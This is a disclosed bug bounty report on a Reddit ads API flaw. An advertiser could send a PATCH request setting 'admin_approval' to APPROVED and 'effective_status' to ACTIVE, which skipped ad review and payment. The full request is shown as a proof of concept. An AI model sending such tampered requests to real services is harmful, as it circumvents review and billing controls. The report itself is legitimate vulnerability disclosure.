# Able to approve admin approval and change effective status without adding payment details . 

## Report Details
- **Report ID**: 1543159
- **URL**: https://hackerone.com/reports/1543159
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-04-17T16:55:48.399Z
- **Disclosed**: 2022-06-22T05:05:02.156Z

## Reporter
- **Username**: bisesh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary:

In https://ads.reddit.com/ you can create campaign under which you can create ads , once you create new campaign , it is on pending stage and will not be delivered unless you add payment details and is reviewed by admin and approved according to what it says here https://advertising.reddithelp.com/en/categories/ad-review/about-reddits-ad-review-process . But changing the value of admin_approval to APPROVED and effective_status to ACTIVE , the ads is approved and thus we receive the confirmation email from reddit ads that our ads is approved .

## Impact:
Can bypass the review process and change the ads status to approve and active without payment process .

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Create a campaign from https://ads.reddit.com 
  1. Go to https://ads.reddit.com/dashboard, you will see a table list that shows your ads and campaign , there the status is stated as PENDING . And we know according to what reddit says , our ads needs to get reviewed by reddit members , but updating the value from api changes our status to ACTIVE . Hence ad is successfully delivered . 
POC video is attached . 

███████

```
PATCH /api/v2.0/accounts/█████/ads/██████████ HTTP/2
Host: ads-api.reddit.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ads.reddit.com/
Authorization: bearer token
Content-Type: application/json
Origin: https://ads.reddit.com
Content-Length: 101
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
X-Pwnfox-Color: magenta
Te: trailers

{"data":
{"configured_status":"ACTIVE",
"effective_status":"ACTIVE",
"admin_approval":"APPROVED"
}}

```

## Supporting Material/References:


  * [attachment / reference]

## Impact

Can bypass the review process and change the ads status to approve and active without payment process .

## Attachments
No attachments
